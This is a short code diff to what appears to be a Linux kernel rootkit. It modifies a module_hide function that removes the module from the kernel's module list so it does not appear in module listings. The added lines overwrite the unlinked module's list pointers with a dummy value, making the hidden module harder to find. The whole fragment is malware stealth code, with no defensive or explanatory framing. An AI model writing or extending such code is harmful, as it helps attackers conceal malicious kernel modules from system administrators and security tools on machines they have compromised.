@@ -318,6 +318,9 @@ module_hide(void)
 {
 	module_previous = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+	
+	THIS_MODULE->list.prev = (void *)0x8163;
+	THIS_MODULE->list.next = (void *)0x8163;
 	module_hidden = 1;
 }
 
